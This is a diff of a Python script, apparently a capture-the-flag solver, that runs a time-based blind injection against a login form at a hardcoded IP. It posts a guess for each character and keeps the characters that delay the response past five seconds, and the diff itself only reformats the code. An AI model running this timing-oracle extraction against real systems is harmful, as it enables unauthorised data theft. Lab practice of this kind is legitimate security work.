@@ -6,7 +6,7 @@ url = "http://140.115.59.7:12005/"
 data = {
     "username": None,
     "password": "arbitrary password",
-    "submit": ""
+    "submit": "",
 }
 
 # Headers based on the provided HTTP request
@@ -31,7 +31,12 @@ digits = list('0123456789')
 special_characters = list('!@#$%^&*()-_=+[]{}|;:\'",.<>/?`~\\')
 
 # Combine all the characters
-combined_list = lowercase_letters + uppercase_letters + digits + special_characters
+combined_list = (
+    lowercase_letters + 
+    uppercase_letters + 
+    digits + 
+    special_characters
+)
 
 flag = ""
 count = 1
@@ -43,7 +48,7 @@ while True:
 
         start_time = time.time()
         response = requests.post(
-            url, 
+            url=url, 
             data=data, 
             headers=headers
         )
@@ -51,7 +56,7 @@ while True:
 
         # Calculate the duration
         duration = end_time - start_time
-        print("char: " + char + "  Duration: " + str(duration) + " seconds")
+        print(f"char: {char} Duration: {duration.__round__(2)} seconds")
         # time.sleep(1)
         if duration > 5:
             flag = flag + char
